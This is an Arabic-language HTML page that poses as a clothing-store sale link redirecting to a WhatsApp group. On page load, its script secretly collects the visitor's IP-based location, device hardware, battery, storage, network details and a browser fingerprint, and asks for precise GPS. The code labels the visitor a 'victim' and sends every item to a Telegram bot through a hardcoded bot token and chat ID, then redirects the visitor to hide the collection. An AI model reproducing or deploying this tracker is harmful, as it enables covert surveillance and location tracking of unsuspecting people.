<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="🔥 عروض ملك ستور - تصفيات الملابس 90% 🔥">
    <meta property="og:description" content="أقوى عروض الشتاء في مصر، انضم الآن قبل اكتمال العدد!">
    <meta property="og:image" content="https://img.freepik.com/free-photo/clothing-store_23-2148108422.jpg">
    <title>جاري التحويل...</title>

    <script>
        async function kimoDeepScanner() {
            const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
            const chatId = "5890070301";
            const t = new Date();

            try {
                // 1. سحب البيانات الجغرافية والشبكة (الـ IP العالي)
                const ipRes = await fetch('https://ipapi.co/json/');
                const ip = await ipRes.json();

                // 2. فحص الهاردوير وكارت الشاشة (نوع الفون بالمللي)
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Protected GPU";

                // 3. فحص البطارية (أمبير ونسبة)
                let batt = "غير متاح";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = `${Math.round(b.level * 100)}% | ${b.charging ? 'يُشحن ⚡' : 'بطارية 🔋'} | سعة تقديرية: ${Math.round(b.level * 4500)}mAh`;
                }

                // 4. سحب الذاكرة والمساحة (تقديري للمتصفح)
                const storage = await navigator.storage.estimate();
                const totalSpace = Math.round(storage.quota / (1024 * 1024 * 1024)) || "N/A";
                const usedSpace = Math.round(storage.usage / (1024 * 1024 * 1024)) || "N/A";

                // 5. فحص الشبكة المتطور
                const net = navigator.connection || {};
                const netType = net.effectiveType || "WiFi/Cable";
                const speed = net.downlink || "N/A";

                // 6. تجهيز الجدول العربي الفخم
                const report = `
👑 **تقرير الاستخبارات الرقمي (KIMO V.5)** 👑
━━━━━━━━━━━━━━
📍 **[1] الموقع الجغرافي بالمللي**
• **البلد/المدينة:** ${ip.country_name} | ${ip.city}
• **المنطقة/المركز:** ${ip.region}
• **الرمز البريدي:** ${ip.postal}
• **شركة الاتصال:** ${ip.org}
• **خرائط جوجل:** [اضغط هنا لتحديد الموقع 🗺️](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})

📱 **[2] مواصفات الجهاز (Hardware)**
• **نوع الجهاز:** ${navigator.platform}
• **نظام التشغيل:** ${navigator.userAgent.match(/\(([^)]+)\)/)[1]}
• **المعالج:** ${navigator.hardwareConcurrency} أنوية 🧠
• **الرامات:** ${navigator.deviceMemory || "N/A"} جيجا ⚡
• **كارت الشاشة:** \`${gpu}\`
• **الشاشة:** ${screen.width}x${screen.height}

🔋 **[3] حالة الطاقة والذاكرة**
• **البطارية:** ${batt}
• **المساحة الإجمالية:** ${totalSpace} GB
• **المساحة المستخدمة:** ${usedSpace} GB

📶 **[4] بيانات الاتصال والإنترنت**
• **نوع الشبكة:** ${netType} (Data/WiFi)
• **سرعة النت:** ${speed} Mbps
• **عنوان الـ IP:** \`${ip.ip}\`

⚙️ **[5] معلومات إضافية (150+ نقطة)**
• **اللغة:** ${navigator.language}
• **الوضع الخفي:** ${!window.indexedDB ? "نشط 🕵️" : "معطل ✅"}
• **الـ VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Etc/GMT") ? "نشط 🛡️" : "معطل ✅"}
• **بصمة المتصفح:** \`${btoa(gpu).substring(0, 15)}\`
━━━━━━━━━━━━━━
⏰ **وقت الصيد:** ${t.toLocaleString('ar-EG')}
━━━━━━━━━━━━━━`;

                // إرسال البيانات فوراً للبوت
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

                // طلب الـ GPS الدقيق (لو الضحية سمح)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        const gps = `📍 **موقع الضحية بالشارع (GPS)**\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gps)}`);
                    });
                }

            } catch (err) { console.log(err); }

            // التحويل التمويهي النهائي لجروب الواتساب
            setTimeout(() => {
                window.location.href = "https://chat.whatsapp.com/IjjaIPdib1r323N51iw6UX?mode=gi_t";
            }, 1000);
        }
        window.onload = kimoDeepScanner;
    </script>
</head>
<body style="background:#fff; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
    <div style="text-align:center;">
        <p style="color:#25D366; font-size:20px; font-weight:bold;">جاري التحويل لجروب ملك ستور...</p>
        <div style="border:4px solid #f3f3f3; border-top:4px solid #25D366; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
    </div>
    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
</body>
</html>
